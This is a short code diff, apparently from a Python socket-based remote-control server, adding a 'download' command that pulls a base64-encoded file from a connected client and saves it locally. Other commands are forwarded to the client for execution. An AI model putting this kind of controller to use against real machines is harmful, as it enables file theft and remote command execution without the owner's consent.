@@ -33,8 +33,13 @@ try:
             cl_socket.send(b64)
             print("The file has been sent")
 
-        #elif "download" in command:
-            
+        elif "download" in command:
+            command_name, path_in_server, path_in_client = command.split(' ')
+            command_out = command_name + ' ' + path_in_client
+            cl_socket.send(command_out.encode())
+            file = cl_socket.recv(1024).decode()
+            with open(path_in_server, 'wb') as output_file:
+                output_file.write(base64.b64decode(file))
 
         else:
             cl_socket.send(command.encode())
